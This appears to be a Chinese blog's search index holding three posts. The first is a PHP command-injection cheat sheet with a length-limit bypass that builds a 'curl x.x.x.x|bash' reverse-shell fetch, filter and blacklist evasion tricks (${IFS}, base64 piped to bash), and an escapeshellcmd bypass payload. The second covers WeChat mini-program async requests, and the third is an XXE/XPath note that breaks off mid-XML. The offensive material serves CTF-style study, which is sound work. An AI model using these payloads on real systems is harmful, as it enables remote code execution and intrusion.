<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>php命令执行小技巧</title>
      <link href="/posts/45c7e77/"/>
      <url>/posts/45c7e77/</url>
      
        <content type="html"><![CDATA[    <div id="aplayer-BGLdNHTm" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="115162" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="none" data-theme="#ad7a86"></div><a id="more"></a><h2 id="突破命令长度限制"><a href="#突破命令长度限制" class="headerlink" title="突破命令长度限制"></a><strong>突破命令长度限制</strong></h2><p>限制条件：长度<strong>&lt;=4</strong></p><p>限制代码：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpshow_source(__FILE__);error_reporting(0);if(strlen($_GET[1])&lt;&#x3D;4)&#123;     echo shell_exec($_GET[1]);&#125;else&#123;     echo &quot;hack!!!&quot;;&#125;?&gt;</code></pre><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a><strong>命令执行</strong></h3><p>先看效果图：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/girls/image-20200814204553709.png" alt loading="lazy"></p><p><strong>原理</strong></p><ol><li><code>&gt;</code>后面跟的文件名，可以生成一个以这个字符串命名的文件</li><li><code>*</code>可以将文件名（按首字母排序）列出来当一行命令执行</li><li><code>*v</code>匹配当前目录下以<code>v</code>结尾的的文件名，<code>*v</code>=<code>rev v</code>，输出<code>v</code>文件内容里面内容的反序结果，<code>&gt;cat|*t</code>同理</li><li><code>dir a b&gt;c</code>只会将<code>a b</code>写到文件<code>c</code>中</li></ol><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a><strong>反弹shell</strong></h3><p>先看效果图：</p><p>获取<code>ls -th &gt;g</code>命令</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/girls/image-20200814220444746.png" alt loading="lazy"></p><p>获取<code>curl x.x.x.x|bash</code>命令</p><p><code>&gt;cu\\</code>这里看着是5个字符，超过了4个的限制，实际上是因为 shell环境需要输入<code>\\</code>产生<code>\</code>，但是<code>php</code> 代码<code>exec</code>时，只需要输入<code>\</code>即可产生<code>\</code>，比如 <code>exec(&quot;&gt;cu\&quot;)</code>即可。所以这里实际上是不超过4个字符的，为了演示直观，在<code>shell</code>中直接执行</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/girls/image-20200814223956562.png" alt loading="lazy"></p><p>执行结果：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/girls/image-20200814221328388.png" alt loading="lazy"></p><p><strong>原理</strong></p><ol><li><code>ls -t</code>按时间顺序排列文件，<code>ls -th</code>不影响命令执行，为了让倒序的时候<code>ht-</code>在<code>sl</code>前面</li><li><code>\</code>  <code>linux</code>下行末加上<code>\</code>会将该行末尾与下一行行首连接起来，简单来说应该是删掉了换行符</li></ol><p>这里需要注意，文件名中不能包含<code>/</code>这个符号的，所以需要将反弹shell的服务器根目录下默认网页设置成curl下反弹shell的命令的网页</p><p>例如我ubuntu服务器的Apache默认网页设置在<code>/etc/apache2/mods-available/dir.conf</code>中，编辑如下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/girls/image-20200814225408259.png" alt loading="lazy"></p><p>1.txt中为反弹shell的命令，这样即可成功执行</p><p>或者你改index.html的内容也行</p><h2 id="绕过空格"><a href="#绕过空格" class="headerlink" title="绕过空格"></a><strong>绕过空格</strong></h2><ul><li>${PS2} 对应字符 ‘&gt;’</li><li>${PS4} 对应字符 ‘+’</li><li>${IFS} 对应 内部字段分隔符</li><li>${9} 对应 空字符串</li></ul><pre class="language-bash" data-language="bash"><code class="language-bash">$&#123;IFS&#125;linux@Extrader:&#x2F;var&#x2F;www&#x2F;html$ cat &#x2F;flagflag&#123;3e23f43-235tg54-2d4t54g-43e3ed23e&#125;linux@Extrader:&#x2F;var&#x2F;www&#x2F;html$ cat$&#123;IFS&#125;&#x2F;flagflag&#123;3e23f43-235tg54-2d4t54g-43e3ed23e&#125;linux@Extrader:&#x2F;var&#x2F;www&#x2F;html$ cat$&#123;IFS&#125;$9&#x2F;flagflag&#123;3e23f43-235tg54-2d4t54g-43e3ed23e&#125;linux@Extrader:&#x2F;var&#x2F;www&#x2F;html$ cat$IFS$9&#x2F;flagflag&#123;3e23f43-235tg54-2d4t54g-43e3ed23e&#125;php下可以cat%09&#x2F;flag&lt;&gt;linux@Extrader:&#x2F;var&#x2F;www&#x2F;html$ cat&lt;&#x2F;flagflag&#123;3e23f43-235tg54-2d4t54g-43e3ed23e&#125;</code></pre><h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a><strong>黑名单绕过</strong></h2><pre class="language-bash" data-language="bash"><code class="language-bash">拼接linux@Extrader:&#x2F;var&#x2F;www&#x2F;html$ a&#x3D;c;b&#x3D;at;c&#x3D;&#x2F;flag;$a$b $cflag&#123;3e23f43-235tg54-2d4t54g-43e3ed23e&#125;base64编码linux@Extrader:&#x2F;var&#x2F;www&#x2F;html$ &#96;echo &quot;Y2F0IC9mbGFn&quot;|base64 -d&#96;flag&#123;3e23f43-235tg54-2d4t54g-43e3ed23e&#125;linux@Extrader:&#x2F;var&#x2F;www&#x2F;html$ echo &quot;Y2F0IC9mbGFn&quot;|base64 -d|bashflag&#123;3e23f43-235tg54-2d4t54g-43e3ed23e&#125;单引号、双引号linux@Extrader:&#x2F;var&#x2F;www&#x2F;html$ c&quot;&quot;at &#x2F;flagflag&#123;3e23f43-235tg54-2d4t54g-43e3ed23e&#125;linux@Extrader:&#x2F;var&#x2F;www&#x2F;html$ c&quot;&quot;at &#x2F;fl&quot;&quot;agflag&#123;3e23f43-235tg54-2d4t54g-43e3ed23e&#125;linux@Extrader:&#x2F;var&#x2F;www&#x2F;html$ c&quot;&quot;at &#x2F;fl&#39;&#39;agflag&#123;3e23f43-235tg54-2d4t54g-43e3ed23e&#125;反斜线 \linux@Extrader:&#x2F;var&#x2F;www&#x2F;html$ ca\t &#x2F;fl\agflag&#123;3e23f43-235tg54-2d4t54g-43e3ed23e&#125;</code></pre><h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a><strong>文件读取</strong></h2><pre class="language-bash" data-language="bash"><code class="language-bash">linux@Extrader:&#x2F;var&#x2F;www&#x2F;html$ cat &#x2F;flag   # 连接文件并打印到标准输出设备上flag&#123;3e23f43-235tg54-2d4t54g-43e3ed23e&#125;linux@Extrader:&#x2F;var&#x2F;www&#x2F;html$ rev &#x2F;flag   # 将文件内容以字符为单位反序输出&#125;e32de3e34-g45t4d2-45gt532-34f32e3&#123;galflinux@Extrader:&#x2F;var&#x2F;www&#x2F;html$ more &#x2F;flag  # 显示文件内容，每次显示一屏flag&#123;3e23f43-235tg54-2d4t54g-43e3ed23e&#125;linux@Extrader:&#x2F;var&#x2F;www&#x2F;html$ tail &#x2F;flag  # 在屏幕上显示指定文件的末尾若干行flag&#123;3e23f43-235tg54-2d4t54g-43e3ed23e&#125;linux@Extrader:&#x2F;var&#x2F;www&#x2F;html$ less &#x2F;flag  # 分屏上下翻页浏览文件内容flag&#123;3e23f43-235tg54-2d4t54g-43e3ed23e&#125;linux@Extrader:&#x2F;var&#x2F;www&#x2F;html$ head &#x2F;flag  # 在屏幕上显示指定文件的开头若干行flag&#123;3e23f43-235tg54-2d4t54g-43e3ed23e&#125;linux@Extrader:&#x2F;var&#x2F;www&#x2F;html$ tac &#x2F;flag   # 将文件以行为单位的反序输出flag&#123;3e23f43-235tg54-2d4t54g-43e3ed23e&#125;linux@Extrader:&#x2F;var&#x2F;www&#x2F;html$ sort &#x2F;flag  # 将文件进行排序并输出flag&#123;3e23f43-235tg54-2d4t54g-43e3ed23e&#125;linux@Extrader:&#x2F;var&#x2F;www&#x2F;html$ nl &#x2F;flag    # 在Linux系统中计算文件内容行号     1  flag&#123;3e23f43-235tg54-2d4t54g-43e3ed23e&#125;linux@Extrader:&#x2F;var&#x2F;www&#x2F;html$ hexdump &#x2F;flag  #显示文件十六进制格式0000000 6c66 6761 337b 3265 6633 3334 322d 35330000010 6774 3435 322d 3464 3574 6734 342d 65330000020 6533 3264 6533 0a7d0000028linux@Extrader:&#x2F;var&#x2F;www&#x2F;html$ cat &#x2F;fl*flag&#123;3e23f43-235tg54-2d4t54g-43e3ed23e&#125;linux@Extrader:&#x2F;var&#x2F;www&#x2F;html$ cat &#x2F;fla?flag&#123;3e23f43-235tg54-2d4t54g-43e3ed23e&#125;</code></pre><h2 id="绕过escapeshellcmd"><a href="#绕过escapeshellcmd" class="headerlink" title="绕过escapeshellcmd"></a><strong>绕过escapeshellcmd</strong></h2><p>测试代码：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php    $command &#x3D; &#39;dir &#39;.$_POST[&#39;dir&#39;];    $escaped_command &#x3D; escapeshellcmd($command);    var_dump($escaped_command);    file_put_contents(&#39;out.bat&#39;,$escaped_command);    system(&#39;out.bat&#39;);?&gt;</code></pre><p>执行<code>.bat</code>文件的时候，利用<code>%1a</code>，可以绕过过滤执行命令。</p><p>payload</p><pre class="language-shell" data-language="shell"><code class="language-shell">dir&#x3D;. %1a whoami</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a><strong>参考</strong></h2><ul><li><a href="https://www.leavesongs.com/content/files/slides/%E6%9D%A5%E8%87%AA%E5%B0%8F%E5%AF%86%E5%9C%88%E9%87%8C%E7%9A%84%E9%82%A3%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7.pdf">来自小密圈里的那些奇技淫巧</a></li><li><a href="https://www.mi1k7ea.com/2019/06/30/命令注入Bypass技巧小结/">命令注入Bypass技巧小结</a></li><li><a href="https://www.freebuf.com/articles/web/154453.html">挖洞经验|命令注入突破长度限制</a></li><li><a href="https://chybeta.github.io/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/">命令执行的一些绕过技巧</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微信小程序有关异步问题的一些操作</title>
      <link href="/posts/80b70afe/"/>
      <url>/posts/80b70afe/</url>
      
        <content type="html"><![CDATA[<p>方法不唯一，后续有新方法再补上~</p><a id="more"></a><h3 id="Promise-对象"><a href="#Promise-对象" class="headerlink" title="Promise 对象"></a>Promise 对象</h3><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> promise <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token comment">/* 异步操作成功 */</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">resolve</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">reject</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>promise<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// success</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// failure</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>关于<code>promise</code>  具体可参考阮老师的<a href="https://es6.ruanyifeng.com/#docs/promise">Promise 对象</a></p><p>或者直接</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">try</span><span class="token punctuation">&#123;</span>    xxx  <span class="token punctuation">&#125;</span>  <span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="同步化异步函数"><a href="#同步化异步函数" class="headerlink" title="同步化异步函数"></a>同步化异步函数</h3><p>app.js</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//app.js</span><span class="token keyword">function</span> <span class="token function">promisify</span><span class="token punctuation">(</span><span class="token parameter">api</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token parameter">opt<span class="token punctuation">,</span> <span class="token operator">...</span>arg</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>      <span class="token function">api</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> opt<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> success<span class="token operator">:</span> resolve<span class="token punctuation">,</span> fail<span class="token operator">:</span> reject <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">...</span>arg<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  request<span class="token operator">:</span> <span class="token function">promisify</span><span class="token punctuation">(</span>wx<span class="token punctuation">.</span>request<span class="token punctuation">)</span><span class="token punctuation">,</span>  getUserInfo<span class="token operator">:</span> <span class="token function">promisify</span><span class="token punctuation">(</span>wx<span class="token punctuation">.</span>getUserInfo<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token function-variable function">onLaunch</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    xxx  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  globalData<span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><p>index.js使用</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> app <span class="token operator">=</span> <span class="token function">getApp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">Page</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  <span class="token function-variable function">showdate</span><span class="token operator">:</span> <span class="token keyword">async</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> res <span class="token operator">=</span> <span class="token keyword">await</span> app<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>url<span class="token operator">:</span><span class="token string">'xxx'</span><span class="token punctuation">,</span><span class="token punctuation">,</span>method<span class="token operator">:</span><span class="token string">'POST'</span><span class="token punctuation">,</span>data<span class="token operator">:</span><span class="token punctuation">&#123;</span>x<span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">,</span>y<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><p><code>Object.assign()</code> 方法用于将所有可枚举属性的值从一个或多个源对象复制到目标对象。它将返回目标对象。</p><h3 id="wx-request请求封装"><a href="#wx-request请求封装" class="headerlink" title="wx.request请求封装"></a>wx.request请求封装</h3><h4 id="异步"><a href="#异步" class="headerlink" title="异步"></a>异步</h4><p><code>api/index.js</code>封装</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token function-variable function">getdata</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">url<span class="token punctuation">,</span> data<span class="token punctuation">,</span> callback</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  wx<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>      url<span class="token operator">:</span> url<span class="token punctuation">,</span>      data<span class="token operator">:</span> data<span class="token punctuation">,</span>      method<span class="token operator">:</span> <span class="token string">'GET'</span><span class="token punctuation">,</span>      header<span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token string">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'application/json'</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">typeof</span> callback <span class="token operator">==</span> <span class="token string">"function"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">callback</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>data<span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token function-variable function">fail</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">typeof</span> callback <span class="token operator">==</span> <span class="token string">"function"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">callback</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> <span class="token function-variable function">postdata</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">url<span class="token punctuation">,</span> data<span class="token punctuation">,</span> callback</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  wx<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>      url<span class="token operator">:</span> url<span class="token punctuation">,</span>      data<span class="token operator">:</span> data<span class="token punctuation">,</span>      method<span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>      header<span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token string">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'application/x-www-form-urlencoded'</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">typeof</span> callback <span class="token operator">==</span> <span class="token string">"function"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">callback</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>data<span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token function-variable function">fail</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">typeof</span> callback <span class="token operator">==</span> <span class="token string">"function"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">callback</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  getdata<span class="token punctuation">,</span>  postdata<span class="token punctuation">&#125;</span></code></pre><p><code>app.js</code>引入</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> api <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span>'<span class="token punctuation">.</span><span class="token operator">/</span>api<span class="token operator">/</span>index<span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  <span class="token function-variable function">onLaunch</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    xxx  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  globalData<span class="token operator">:</span> <span class="token punctuation">&#123;</span>    api  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><p><code>index.js</code>使用</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">getApp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> api <span class="token operator">=</span> app<span class="token punctuation">.</span>globalData<span class="token punctuation">.</span>api<span class="token function">Page</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  api<span class="token punctuation">.</span><span class="token function">getdata</span><span class="token punctuation">(</span><span class="token string">"xxx"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  api<span class="token punctuation">.</span><span class="token function">postdata</span><span class="token punctuation">(</span><span class="token string">"xxx"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>x<span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">,</span>y<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><h4 id="同步"><a href="#同步" class="headerlink" title="同步"></a>同步</h4><p><code>app.js</code>引入</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">promisify</span><span class="token punctuation">(</span><span class="token parameter">api</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token parameter">opt<span class="token punctuation">,</span> <span class="token operator">...</span>arg</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>      <span class="token function">api</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> opt<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> success<span class="token operator">:</span> resolve<span class="token punctuation">,</span> fail<span class="token operator">:</span> reject <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">...</span>arg<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  request<span class="token operator">:</span> <span class="token function">promisify</span><span class="token punctuation">(</span>wx<span class="token punctuation">.</span>request<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><p><code>index.js</code>使用</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">getApp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">Page</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  <span class="token function-variable function">showdate</span><span class="token operator">:</span> <span class="token keyword">async</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> res <span class="token operator">=</span> <span class="token keyword">await</span> app<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>url<span class="token operator">:</span><span class="token string">'xxx'</span><span class="token punctuation">,</span>method<span class="token operator">:</span><span class="token string">'GET'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://es6.ruanyifeng.com/#docs/promise">Promise 对象</a></li><li><a href="https://blog.csdn.net/weixin_44833680/article/details/102658108">微信小程序封装异步请求</a></li><li><a href="https://developers.weixin.qq.com/community/develop/article/doc/00028cbc2e04e0ddf549d535351c13">将小程序原生异步函数promisify后，在async/await中使用</a></li><li><a href="https://developers.weixin.qq.com/community/develop/article/doc/000ceaee71c9d09ae5b8c77d151813">微信小程序中使用Async/Await方法异步请求变为同步请求</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE学习笔记</title>
      <link href="/posts/55c267c8/"/>
      <url>/posts/55c267c8/</url>
      
        <content type="html"><![CDATA[    <div id="aplayer-AyEUPsFD" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="5174564734" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="none" data-theme="#ad7a86"></div><a id="more"></a><h3 id="XPath注入"><a href="#XPath注入" class="headerlink" title="XPath注入"></a>XPath注入</h3><p>XPath注入对象是一个存储数据的XML文件</p><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p><strong>index.xml</strong></p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>users</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>root<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>rootpwd<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>admin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>adminpwd<span class="token tag"><span class="token 